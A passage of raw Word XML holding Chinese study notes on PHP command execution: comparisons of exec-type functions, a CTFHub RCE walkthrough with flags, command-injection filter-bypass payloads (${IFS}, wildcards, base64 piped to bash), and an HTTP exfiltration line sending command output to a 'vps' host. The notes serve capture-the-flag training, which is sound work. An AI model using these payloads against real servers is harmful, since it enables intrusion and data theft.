          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>resource</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>（进程句柄）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 管道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退出码：✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>proc_close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pcntl_exec()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直接回显：✅ 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返回值：无（替换进程）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多行：✅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退出码：❌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实测输出对照：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             回显: line1\nline2\nkali\n    返回: 'kali'          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exec               回显: （空）                    返回: 'kali'           退出码=0  数组=["line1","line2","kali"]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shell_exec         回显: （空）                    返回: 'line1\nline2\nkali\n'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passthru           回显: line1\nline2\nkali\n    返回: NULL            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反引号 `cmd`       回显: （空）                    返回: 'line1\nline2\nkali\n'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popen+pclose       回显: （空）                    返回: 'line1\nline2\nkali\n'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proc_open          回显: （空）                    返回: 'line1\nline2\nkali\n' 退出码=0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三分类总结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【直接回显】结果直接进响应体，不需要变量接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system / passthru / pcntl_exec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【返回结果】结果装进变量，要 echo 才显示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exec（末行）/ shell_exec（全部）/ 反引号（全部）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【返回句柄】给你个指针，自己读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popen / proc_open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选型速查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要立刻看到结果：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>system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结果要处理/过滤：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>shell_exec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>（全部字符串）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要多行数组：</w:t>
      </w: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+ 第 2 参数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要退出码：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>system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passthru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要 stderr：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>proc_open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双向交互：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>popen("w")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proc_open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无回显时：</w:t>
      </w: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shell_exec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 拿返回值再外带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3.3 代码执行类函数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eval()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说明：执行任意 PHP 代码（语言结构）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assert()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说明：老版本可执行字符串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版本限制：PHP 7.2+ 不再执行字符串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create_function()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说明：动态造函数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版本限制：PHP 7.2 废弃，8 移除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preg_replace(/e)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说明：执行替换结果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版本限制：PHP 7 移除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call_user_func()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call_user_func_array()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说明：回调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array_map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array_filter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array_reduce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说明：回调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usort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uasort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说明：排序回调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ob_start()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说明：输出缓冲回调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include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require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说明：文件包含（配合伪协议）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版本限制：全版本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PHP 8 实测：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eval("system('id');");                    // ✅ 有输出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assert("system('id');");                  // ❌ 8.x 不执行字符串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create_function('', 'system("id");');     // ❌ 8.x 已移除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preg_replace('/.*/e', 'system("id")', ''); // ❌ 7.x 已移除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call_user_func('system', 'id');           // ✅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array_map('system', ['id']);              // ✅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3.4 其它可注入命令的地方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mail($to,$sub,$msg,$hdr,$param)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">：第 5 参数传给 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>sendmail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putenv("LD_PRELOAD=...")</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：设置环境变量，劫持动态库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imap_open($mailbox,...)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：mailbox 参数可注入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error_log($msg, 1, $to)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$to</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 传给 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>sendmail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mb_send_mail</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">：同 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>mail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pcntl_exec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">：常被忘在 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>disable_functions</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 之外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dl()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：加载 PHP 扩展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ImageMagick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convert</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：文件名注入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3.5 CTFHub RCE 模块通关（8 题）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题型：命令注入-无过滤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flag：cat`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题型：eval 代码执行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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>?cmd=system("ls /");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ctfhub{7234bb617c6421e4b8e40365}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题型：过滤 cat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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>cat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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>tac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c\at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/bin/c?t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ctfhub{5c3d2c0615beb813269640b6}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题型：过滤空格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过滤：空格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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>${IFS}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ctfhub{7d4f698eda802c44829c9db7}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题型：过滤目录分隔符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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>${PATH:0:1}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ctfhub{fba85d19b6751d803b3cee7c}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题型：过滤运算符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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>&amp;`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;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> / 换行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题型：综合练习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过滤：8 项全过滤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绕过：见下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ctfhub{7d928b22123076276bb32251}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综合题的源码（最难的）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preg_match_all("/(\||&amp;|;| |\/|cat|flag|ctfhub)/", $ip, $m)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8 个过滤项：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&amp;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匹配：与号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匹配：分号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 xml:space="preserve"> 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匹配：空格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\/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匹配：斜杠（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是定界符，要转义）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cat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匹配：字符串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匹配：字符串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8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模式：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ctfhub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匹配：字符串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最终 payload：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%0a${PATH:0:1}bin${PATH:0:1}c?t${IFS}f?ag_is_here${PATH:0:1}*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逐段拆解：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%0a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">：换行（代替被过滤的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> `\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${PATH:0:1}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/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bin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/bin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c?t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cat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?</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 通配）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${IFS}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：空格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f?ag_is_here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flag_is_here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?</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 通配）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*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：目录里的文件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展开后：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/bin/cat /var/www/html/flag_is_here/flag_273182659722304.php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文件包含类（4 题，同属 RCE 模块）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文件包含 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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>strpos($file,"flag")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打法：借 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>shell.txt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>eval($_REQUEST['ctfhub'])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ctfhub{b4e8289cf23e6289829fb568}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文件包含 2（必须 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>php://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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>substr($file,0,6)==="php://"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打法：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>php://input</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> + POST 代码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ctfhub{29c7fc65ea7034f067119535}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文件包含 3（必须 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>php://</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，flag 路径已知）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过滤：同上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打法：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>php://filter/resource=/flag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ctfhub{95366c4682c791d1ff3f4272}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文件包含 4（无 shell.txt）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过滤：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>strpos($file,"flag")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打法：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>php://input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flag：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ctfhub{3e8215ea4ad95ff54cb15fe2}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3.6 绕过方式总结（6 类）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3.6.1 空格绕过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目标：让 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>cat /flag</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里的空格不被过滤。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${IFS}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cat${IFS}/flag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 最稳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$IFS$9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cat$IFS$9/flag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$IFS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cat$IFS/flag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花括号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{cat,/flag}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重定向 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>&lt;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cat&lt;/flag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制表符 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>%09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cat%09/flag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$'\t'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cat$'\t'/flag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$'\x20'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cat$'\x20'/flag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⚠️ 反直觉的实测结果：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空格   (0x20) → ✅ 当空格用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制表   (0x09) → ✅ 当空格用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换行   (0x0a) → ❌ 不是空格 —— 它是【命令分隔符】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回车   (0x0d) →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垂直制表 (0x0b) → ❌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C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>${IFS}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是什么：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>IFS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> = Internal Field Separator，shell 的分词符，默认值 = 空格 + 制表 + 换行。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为什么必须加 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>{}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echo$IFShello    → 变量名被解析成 "IFShello" → 空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echo${IFS}hello  → 明确变量名是 IFS → hello ✅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3.6.2 关键字绕过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反斜杠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ec\ho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单/双引号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ec''ho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ec""ho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变量拼接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a=ec;b=ho;$a$b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通配 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>?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/bin/ec?o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通配 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>*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/bin/e*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实测：⚠️ 会匹配到多个（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/bin/editor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 等）→ 失败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命令替换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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>$(echo ec)ho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反引号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payload：`</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>echo ec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">ho </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr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实测：✅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Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的坑（实测）：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/bin/e*  →  /bin/editor /bin/egrep /bin/elfedit ... hello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↑ 匹配到一堆，第一个直接当命令跑 → 失败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所以 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 比 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 安全：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/bin/ec?o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 只有一个匹配。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⚠️ 通配符必须有"目录上下文"：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c?t          → 在【当前目录】找 → 没有匹配 → 命令不存在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/bin/c?t     → 在【/bin】找 → 匹配 /bin/cat ✅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常用替换表：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cat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tac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c\at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c'a't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/bin/c?t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$a$b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flag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f?ag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f*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????_??_????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[f]lag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空格：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>${IFS}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$IFS$9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&lt;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%09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斜杠：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>${PATH:0:1}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$'\57'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3.6.3 命令分隔符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行为：顺序执行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前者输出去哪：直接输出（被 exec 收集）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行为：`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前者输出去哪：管道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行为：\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前者输出去哪：`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&amp;&amp;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行为：前者成功才执行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前者输出去哪：直接输出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&amp;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行为：后台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前者输出去哪：直接输出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%0a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>（换行）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行为：同 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>;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前者输出去哪：直接输出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为什么本题用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>|</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 更好（实测耗时对比）：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127.0.0.1;id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拼成的命令：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ping -c 4 127.0.0.1;id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耗时：3425 ms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输出行数：9 行（混）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拼成的命令：id`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耗时：`ping -c 4 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输出行数：id`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原因：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>|</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 让 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ping -c 4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 立刻失败（不用等 4 秒），且它的 stdout 被管道吃掉。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3.6.4 编码绕过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① base64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system(base64_decode("aWQ="));           // id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② hex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 shell_exec(hex2bin("6964"));        // id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③ 反转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system(strrev("galf/ tac"));             // cat /flag</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pP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shell 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$'\x63\x61\x74' /flag                     #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 'Y2F0IC9mbGFn' | base64 -d | bash    # cat /flag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3.6.5 无回显外带（5 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写文件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命令：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>id &gt; /var/www/html/o.txt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前提：知道 web 根 + 可写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HTTP 外带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命令：`curl http://vps/?x=$(id\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前提：base64 -w0)`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DNS 外带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命令：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
